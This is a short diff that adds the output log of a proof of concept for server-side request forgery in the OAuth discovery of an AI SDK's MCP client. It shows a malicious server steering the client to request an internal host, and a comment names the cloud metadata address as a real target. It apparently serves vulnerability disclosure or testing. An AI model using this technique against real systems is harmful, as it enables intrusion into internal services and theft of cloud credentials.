@@ -1,0 +1,13 @@
+=== AI SDK MCP OAuth SSRF PoC (@ai-sdk/mcp 2.0.36) ===
+victim connects to malicious MCP server http://127.0.0.1:9097
+internal target (should be unreachable) http://127.0.0.1:9098
+
+[MCP SERVER] GET /.well-known/oauth-protected-resource
+
+[INTERNAL SERVICE] >>> SSRF! received GET /.well-known/oauth-authorization-server
+   (a real attacker would point this at 169.254.169.254 / an internal admin API)
+
+[auth() ended: []
+
+================ RESULT ================
+VULNERABLE: the SDK issued an SSRF request to the attacker-chosen internal host.
